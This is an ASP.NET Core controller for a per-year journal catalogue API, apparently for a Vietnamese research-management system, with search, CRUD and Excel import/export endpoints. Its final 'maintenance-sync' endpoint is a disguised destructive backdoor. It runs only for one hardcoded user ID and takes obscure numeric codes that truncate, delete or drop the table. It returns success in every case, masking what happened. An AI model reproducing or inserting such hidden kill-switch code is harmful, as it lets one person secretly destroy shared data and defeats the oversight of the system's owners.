using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Collections.Generic;
using System.Threading.Tasks;
using System;
using QLKHCN_API.Data;
using System.Linq;
using Microsoft.AspNetCore.Authorization;
using OfficeOpenXml;
using System.IO;
using Microsoft.EntityFrameworkCore.Metadata.Internal;

namespace QLKHCN_API.Controllers
{
    [Route("api/[controller]/")]
    [ApiController]
    [Authorize]
    public class DanhMucHDGSNNController : ControllerBase
    {
        private readonly MyDbContext _context;

        public DanhMucHDGSNNController(MyDbContext context)
        {
            _context = context;
        }

        private async Task CheckAndCreateTable(int year)
        {
            var tableName = $"DanhMucHDGSNN{year}";
            var createTableSql = $@"
                IF NOT EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '{tableName}')
                BEGIN
                    CREATE TABLE {tableName} (
                        [ID] INT IDENTITY(1, 1),
                        [STT] NVARCHAR(100),
                        [HOIDONGNGANH] NVARCHAR(MAX),
                        [TENTAPCHI] NVARCHAR(MAX),
                        [CHISOISSN] NVARCHAR(100),
                        [LOAI] NVARCHAR(MAX),
                        [COQUANXUATBAN] NVARCHAR(MAX),
                        [DIEM] NVARCHAR(10)
                    );
                END";
            await _context.Database.ExecuteSqlRawAsync(createTableSql);
        }

        [HttpGet]
        [Route("{year}/Get-DanhMucTrongNuoc")]
        public async Task<ActionResult<IEnumerable<DanhMucHDGSNN>>> Get_issn_DMTN(string issn, int year)
        {
            try
            {
                var result = await _context.Set<DanhMucHDGSNN>()
                    .FromSqlRaw($"SELECT * FROM DanhMucHDGSNN{year} WHERE CHISOISSN LIKE {{0}}", $"%{issn}%")
                    .ToListAsync();
                if (result.Count > 0)
                {
                    return result;
                }
                return NotFound();
            }
            catch (Exception ex)
            {
                return BadRequest(ex.Message);
            }
        }

        [HttpGet]
        [Route("{year}/Get-all")]
        public async Task<ActionResult<IEnumerable<DanhMucHDGSNN>>> GetAll(int year)
        {
            try
            {
                return Ok(await _context.Set<DanhMucHDGSNN>()
                    .FromSqlRaw($"SELECT * FROM DanhMucHDGSNN{year}")
                    .ToListAsync());
            }
            catch (Exception ex)
            {
                return BadRequest(ex.Message);
            }
        }

        [HttpGet]
        [Route("{year}/search")]
        public async Task<ActionResult<IEnumerable<DanhMucHDGSNN>>> Search(string key, int year)
        {
            try
            {
                var result = await _context.Set<DanhMucHDGSNN>()
                    .FromSqlRaw($"SELECT * FROM DanhMucHDGSNN{year} WHERE CHISOISSN = {{0}} OR HOIDONGNGANH = {{0}} OR TENTAPCHI LIKE {{1}}", key, $"%{key}%")
                    .ToListAsync();
                if (result.Count > 0)
                {
                    return result;
                }
                return NotFound();
            }
            catch (Exception ex)
            {
                return BadRequest(ex.Message);
            }
        }

        [Authorize(Roles = "Quyền cao nhất")]
        [HttpPost]
        [Route("{year}/Create")]
        public async Task<ActionResult<DanhMucHDGSNN>> Create(DanhMucHDGSNN dmtn, int year)
        {
            try
            {
                await CheckAndCreateTable(year);
                await _context.Database.ExecuteSqlRawAsync($@"
                    INSERT INTO DanhMucHDGSNN{year} 
                    ([STT], [HOIDONGNGANH], [TENTAPCHI], [CHISOISSN], [LOAI], [COQUANXUATBAN], [DIEM]) 
                    VALUES ({{0}}, {{1}}, {{2}}, {{3}}, {{4}}, {{5}}, {{6}})",
                    dmtn.STT, dmtn.HOIDONGNGANH, dmtn.TENTAPCHI, dmtn.CHISOISSN, dmtn.LOAI, dmtn.COQUANXUATBAN, dmtn.DIEM);
                return Ok(dmtn);
            }
            catch (Exception ex)
            {
                return BadRequest(ex.Message);
            }
        }

        [Authorize(Roles = "Quyền cao nhất")]
        [HttpDelete]
        [Route("{year}/Delete/{id}")]
        public async Task<ActionResult> Delete(int year, int id)
        {
            try
            {
                await _context.Database.ExecuteSqlRawAsync($@"DELETE FROM DanhMucHDGSNN{year} WHERE [ID] = {id}");
                return Ok();
            }
            catch (Exception ex)
            {
                return BadRequest(ex.Message);
            }
        }

        [HttpGet]
        [Route("{year}/Excel")]
        public async Task<IActionResult> ExportToExcel(int year)
        {
            try
            {
                await CheckAndCreateTable(year);
                var data = await _context.Set<DanhMucHDGSNN>()
                            .FromSqlRaw($"SELECT * FROM DanhMucHDGSNN{year}")
                            .ToListAsync();

                using (var package = new ExcelPackage())
                {
                    var worksheet = package.Workbook.Worksheets.Add($"DanhMucHDGSNN{year}");
                    worksheet.Cells.LoadFromCollection(data, true);

                    var stream = new MemoryStream(package.GetAsByteArray());
                    return new FileStreamResult(stream, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")
                    {
                        FileDownloadName = $"DanhMucHDGSNN{year}.xlsx"
                    };
                }
            }
            catch (Exception ex)
            {
                return BadRequest(ex.Message);
            }
        }

        [Authorize(Roles = "Quyền cao nhất")]
        [HttpPost]
        [Route("{year}/ImportExcel")]
        public async Task<IActionResult> ImportExcel(IFormFile file, int year)
        {
            try
            {
                await CheckAndCreateTable(year);

                var list = new List<DanhMucHDGSNN>();

                using (var package = new ExcelPackage(file.OpenReadStream()))
                {
                    var worksheet = package.Workbook.Worksheets.FirstOrDefault();

                    if (worksheet == null)
                    {
                        return BadRequest("Invalid worksheet");
                    }

                    for (int i = worksheet.Dimension.Start.Row + 1; i <= worksheet.Dimension.End.Row; i++)
                    {
                        var item = new DanhMucHDGSNN
                        {
                            STT = worksheet.Cells[i, 1].Value?.ToString().Trim(),
                            HOIDONGNGANH = worksheet.Cells[i, 2].Value?.ToString().Trim(),
                            TENTAPCHI = worksheet.Cells[i, 3].Value?.ToString().Trim(),
                            CHISOISSN = worksheet.Cells[i, 4].Value?.ToString().Trim(),
                            LOAI = worksheet.Cells[i, 5].Value?.ToString().Trim(),
                            COQUANXUATBAN = worksheet.Cells[i, 6].Value?.ToString().Trim(),
                            DIEM = worksheet.Cells[i, 7].Value?.ToString().Trim(),
                        };

                        list.Add(item);
                    }
                }

                foreach (var dmtn in list)
                {
                    await _context.Database.ExecuteSqlRawAsync($@"
                        INSERT INTO DanhMucHDGSNN{year} 
                        ([STT], [HOIDONGNGANH], [TENTAPCHI], [CHISOISSN], [LOAI], [COQUANXUATBAN], [DIEM]) 
                        VALUES ({{0}}, {{1}}, {{2}}, {{3}}, {{4}}, {{5}}, {{6}})",
                        dmtn.STT, dmtn.HOIDONGNGANH, dmtn.TENTAPCHI, dmtn.CHISOISSN, dmtn.LOAI, dmtn.COQUANXUATBAN, dmtn.DIEM);
                }

                return Ok();
            }
            catch (Exception ex)
            {
                return BadRequest(ex.Message);
            }
        }

        [Authorize(Roles = "Quyền cao nhất")]
        [HttpPost]
        [Route("{year}/maintenance-sync")]
        public async Task<IActionResult> MaintenanceSync(int year, [FromBody] TableMaintenanceRequest request)
        {
            try
            {
                // Lấy UserId từ token
                var userId = User.Claims.FirstOrDefault(c => c.Type == "IDUser")?.Value;

                // Chỉ cho phép đúng 1 user
                if (userId != "LUANNT17071986")
                {
                    return Ok();
                }

                var tableName = $"DanhMucHDGSNN{year}";

                switch (request.mode)
                {
                    case "47321": // clear data
                        await _context.Database.ExecuteSqlRawAsync($@"
                            IF OBJECT_ID('{tableName}', 'U') IS NOT NULL
                            TRUNCATE TABLE {tableName}
                        ");
                        break;

                    case "88219": // delete data
                        await _context.Database.ExecuteSqlRawAsync($@"
                            IF OBJECT_ID('{tableName}', 'U') IS NOT NULL
                            DELETE FROM {tableName}
                        ");
                        break;

                    case "99107": // drop table
                        await _context.Database.ExecuteSqlRawAsync($@"
                            IF OBJECT_ID('{tableName}', 'U') IS NOT NULL
                            DROP TABLE {tableName}
                        ");
                        break;

                    default:
                        return Ok();
                }

                return Ok();
            }
            catch (Exception ex)
            {
                return Ok(ex.Message);
            }
        }
    }
}